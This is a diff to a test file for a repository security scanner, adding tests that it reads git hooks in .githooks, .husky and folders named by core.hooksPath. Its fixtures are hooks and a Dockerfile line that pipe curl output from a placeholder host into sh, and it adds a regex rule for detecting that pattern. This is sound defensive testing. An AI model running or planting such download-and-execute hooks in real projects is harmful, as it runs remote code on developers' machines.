@@ -11,6 +11,7 @@ import { afterEach, describe, expect, it, vi } from "vitest"
 import {
   FETCH_CONCURRENCY,
   extractCommandTargets,
+  extractHooksPaths,
   scanGitHubRepo,
 } from "../src/github/repo-scanner"
 import { MAX_TARBALL_COMPRESSED_BYTES } from "../src/github/tarball"
@@ -1198,6 +1199,124 @@ describe("container builds, devcontainers and nested instruction files", () => {
   })
 })
 
+describe("git hooks a repo switches on for itself", () => {
+  const signatures = (...rules: SignatureDatabase["yaraRules"]): SignatureDatabase => ({
+    ...EMPTY_SIGNATURES,
+    yaraRules: rules
+  })
+  const SHELL_DOWNLOAD_EXEC = {
+    id: "DOWNLOAD_PIPED_TO_SHELL", name: "Download piped into a shell",
+    pattern: String.raw`\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:ba)?sh\b`,
+    description: "curl | sh", tags: [], severity: "high" as const,
+    confidence: "medium" as const, fileExtensions: [".sh", ".ps1"]
+  }
+  const HOOK_ONLY = {
+    id: "HOOK_ONLY", name: "git hook only", pattern: String.raw`\bcurl\b`,
+    description: "hook", tags: [], severity: "high" as const,
+    confidence: "high" as const, fileExtensions: [".githook.sh"]
+  }
+  const HOOK = "#!/bin/sh\ncurl -s https://example.invalid/hook | sh\n"
+
+  it("reads hooks in .githooks and .husky as shell scripts", async () => {
+    global.fetch = mockGitHubApi({
+      ".githooks/pre-commit": HOOK,
+      ".husky/pre-push": HOOK,
+      "src/index.js": "export {}\n"
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: signatures(SHELL_DOWNLOAD_EXEC) })
+    expect(result.scanSummary.scannedFiles).toEqual(
+      expect.arrayContaining([".githooks/pre-commit", ".husky/pre-push"])
+    )
+    expect(result.scanSummary.skippedFiles).toEqual([])
+    expect(result.findings.filter((f) => f.pattern === "DOWNLOAD_PIPED_TO_SHELL").map((f) => f.file).sort())
+      .toEqual([".githooks/pre-commit", ".husky/pre-push"])
+  })
+
+  it("reads only the names git runs, and not husky's generated runners", async () => {
+    global.fetch = mockGitHubApi({
+      ".githooks/pre-commit": "#!/bin/sh\nnpm test\n",
+      ".githooks/notes": "curl https://example.invalid | sh\n",
+      ".husky/_/pre-commit": "#!/bin/sh\n. \"$(dirname \"$0\")/h\"\n",
+      ".husky/.gitignore": "_\n"
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })
+    expect(result.scanSummary.scannedFiles).toEqual([".githooks/pre-commit"])
+    expect(result.scanSummary.skippedFiles.map((s) => `${s.reason} ${s.path}`).sort()).toEqual([
+      "unsupported-type .githooks/notes",
+      "unsupported-type .husky/.gitignore",
+      "unsupported-type .husky/_/pre-commit"
+    ])
+  })
+
+  it("lets a rule target just git hooks", async () => {
+    global.fetch = mockGitHubApi({
+      ".husky/pre-commit": HOOK,
+      "scripts/install.sh": HOOK,
+      "Dockerfile": "FROM alpine\nRUN curl -s https://example.invalid/i | sh\n"
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: signatures(HOOK_ONLY) })
+    expect(result.findings.map((f) => `${f.pattern} ${f.file}`)).toEqual(["HOOK_ONLY .husky/pre-commit"])
+  })
+
+  it("follows core.hooksPath from a package.json script to the folder it names", async () => {
+    global.fetch = mockGitHubApi({
+      "package.json": JSON.stringify({
+        scripts: { prepare: "git config core.hooksPath tools/git-hooks" }
+      }),
+      "tools/git-hooks/pre-commit": HOOK,
+      "tools/git-hooks/install-notes": "Hooks for this repo.\n",
+      "other/pre-commit": HOOK
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: signatures(HOOK_ONLY) })
+    expect(result.scanSummary.scannedFiles).toEqual(["package.json", "tools/git-hooks/pre-commit"])
+    expect(result.scanSummary.skippedFiles.map((s) => s.path).sort())
+      .toEqual(["other/pre-commit", "tools/git-hooks/install-notes"])
+    expect(result.scanSummary.skippedCount).toBe(2)
+    expect(result.findings.map((f) => `${f.pattern} ${f.file}`))
+      .toEqual(["HOOK_ONLY tools/git-hooks/pre-commit"])
+  })
+
+  it("does not follow core.hooksPath out of the repo or out of a test fixture", async () => {
+    global.fetch = mockGitHubApi({
+      "package.json": JSON.stringify({
+        scripts: { prepare: "git config --global core.hooksPath ~/hooks && git config core.hooksPath /etc/hooks" }
+      }),
+      "test/fixtures/app/package.json": JSON.stringify({
+        scripts: { prepare: "git config core.hooksPath hooks" }
+      }),
+      "test/fixtures/app/hooks/pre-commit": HOOK
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: signatures(HOOK_ONLY) })
+    expect(result.scanSummary.scannedFiles).not.toContain("test/fixtures/app/hooks/pre-commit")
+    expect(result.findings.filter((f) => f.pattern === "HOOK_ONLY")).toEqual([])
+  })
+
+  it("names the folders a script points core.hooksPath at", () => {
+    const manifest = (prepare: string) => JSON.stringify({ scripts: { prepare } })
+    expect(extractHooksPaths(manifest("git config core.hooksPath .githooks"), "package.json"))
+      .toEqual([".githooks"])
+    expect(extractHooksPaths(manifest("git config --local core.hookspath './hooks/'"), "web/package.json"))
+      .toEqual(["web/hooks"])
+    expect(extractHooksPaths(manifest("husky install .config/husky"), "package.json"))
+      .toEqual([".config/husky"])
+    expect(extractHooksPaths(manifest("is-ci || husky .config/husky"), "package.json"))
+      .toEqual([".config/husky"])
+    // `.husky` is already read; these name no other folder.
+    for (const script of ["husky", "husky install", "husky init", "husky add .husky/pre-commit 'npm test'",
+      "git config --unset core.hooksPath", "git config core.hooksPath /dev/null"]) {
+      expect(extractHooksPaths(manifest(script), "package.json")).toEqual([])
+    }
+    expect(extractHooksPaths("{ not json", "package.json")).toEqual([])
+  })
+
+  it("resolves the files a hook runs from the repo root, where git runs it", () => {
+    expect(extractCommandTargets("#!/bin/sh\nnode scripts/check.js\n", ".husky/pre-commit"))
+      .toEqual(["scripts/check.js"])
+    expect(extractCommandTargets("#!/bin/sh\nnode scripts/check.js\n", "tools/hooks/pre-commit", true))
+      .toEqual(["scripts/check.js"])
+  })
+})
+
 describe("config patterns never swallow a source file", () => {
   it("scans Dockerfile.ts with the source detectors, not as a container build", async () => {
     const SOURCE_RULE: SignatureDatabase = {
@@ -1827,6 +1946,37 @@ describe("reading the repo as one tarball", () => {
       result.scanSummary.skippedFiles.every((file) => file.reason === "over-file-limit")
     ).toBe(true)
     expect(result.scanSummary.skippedCount).toBeGreaterThan(0)
+  })
+
+  it("reads committed git hooks, and the folder core.hooksPath names, from the archive", async () => {
+    const hook = "#!/bin/sh\ncurl -s https://example.invalid/hook | sh\n"
+    const api = mockTarballApi({
+      "package.json": JSON.stringify({ scripts: { prepare: "git config core.hooksPath tools/hooks" } }),
+      ".githooks/pre-commit": hook,
+      "tools/hooks/pre-push": hook,
+      "elsewhere/post-merge": hook
+    })
+    const result = await scanGitHubRepo(repoInfo, {
+      tarball: true,
+      signatures: {
+        ...EMPTY_SIGNATURES,
+        yaraRules: [{
+          id: "HOOK_ONLY", name: "git hook only", pattern: String.raw`\bcurl\b`,
+          description: "hook", tags: [], severity: "high", confidence: "high",
+          fileExtensions: [".githook.sh"]
+        }]
+      }
+    })
+
+    expect(result.scanSummary.readMode).toBe("tarball")
+    expect(result.scanSummary.scannedFiles.sort())
+      .toEqual([".githooks/pre-commit", "package.json", "tools/hooks/pre-push"])
+    expect(result.scanSummary.skippedFiles)
+      .toEqual([{ path: "elsewhere/post-merge", reason: "unsupported-type" }])
+    expect(result.findings.map((f) => f.file).sort())
+      .toEqual([".githooks/pre-commit", "tools/hooks/pre-push"])
+    // The hooks folder a manifest named was in the archive already.
+    expect(api.contentReads()).toEqual([])
   })
 
   describe("configs and fonts are budgeted by bytes, not counted", () => {
